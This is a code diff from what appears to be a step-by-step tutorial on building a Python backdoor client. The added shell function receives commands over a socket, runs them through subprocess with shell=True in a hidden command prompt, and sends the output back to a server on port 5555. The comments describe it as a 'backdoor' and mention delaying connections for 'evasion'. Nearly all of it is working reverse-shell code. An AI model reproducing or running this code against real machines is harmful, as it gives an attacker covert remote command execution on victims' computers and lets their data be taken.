@@ -1,7 +1,9 @@
-# Day 8 - The Json Module
+# Day 9 - Creating the Shell
 
 import socket
 import json
+import subprocess # 2
+import os # 2
 
 def ip_address():
     global server_ip
@@ -11,14 +13,12 @@ def ip_address():
     serv_ip.close()
     return server_ip
 
-########################
+#########################
 
 server_ip = ip_address() 
-server_port = 5555
+server_port = 5555 
 
-########################
-
-
+#########################
 
 def json_send(data):
     jsondata = json.dumps(data)
@@ -32,6 +32,7 @@ def json_recv(size=1024):
             return json.loads(data)
         except ValueError:
             continue
+
 
 def message_send(string, size=8):
     no_str = False
@@ -62,32 +63,52 @@ def message_recv(size=8):
     return body
 
 
-def connection(): # 11
+def shell():
+    while True:
+        command = json_recv() # 9
+        if command == 'cd':
+            pass
+        elif command == 'ls':
+            pass
+        elif command == 'clear':
+            pass
+        elif command == 'quit':
+            break
+        else: # 10
+            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) # 11
+            result = execute.stdout.read() + execute.stderr.read() # 11
+            result = result.decode() # 12
+            json_send(result) # 13
+
+
+def connection():   
     global client
     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
     while True:
-        time.sleep(0) # 12
+        time.sleep(0)
         try:
             client.connect((server_ip, server_port))
-            shell() # 14
+            shell()
             client.close()
             break
-        except: # 13
+        except:
             connection()
 
 connection()
 
-# testing
 
 
 ########################
-# 11    Renamed and also added a while loop; so that it will always initiate to connect to the server.
-# 12    I also added time.sleep(0) which we are going to make 1-10 seconds in the future to avoid unnecessary errors
-#       and to delay the connection to the server (evasion)
-#       it will always try to connect to the server and if it has an error...
-# 13    It will try again to connect. similarly to the json_recv that we did.
-# 14    If it successfully connected to the server, We are now going to the shell fucntion which is not existed yet.
-#       This the most exciting part of the course, we are going to make a shell on our next topic. and we will use json functions that we did.
+
+# 9     We are going to decode the given cxommand using the new functions json_send/json_recv
+# 10    if the client.py script does not receive any given commands from ['cd', 'ls',' 'clear', 'quit'],
+#       it will assume that there are another commands that is going to execute in the command prompt (windows)
+#       from the new module subprocess, we are going to open a command prompt from the client that is not visible by the client. (backdoor)
+#       please see the documentations of subprocess from this link https://docs.python.org/3/library/subprocess.html
+#       and whatever the result is going to assigned to the 'execute' variable
+# 11    now, in order to send it back to the server, we have to read the output from the invisible command prompt, and assign it to result.
+# 12    since it is encoded, we have to decode it first.
+# 13    and then we are going to send the output using json_send to back to the server.
 
 ########################
 
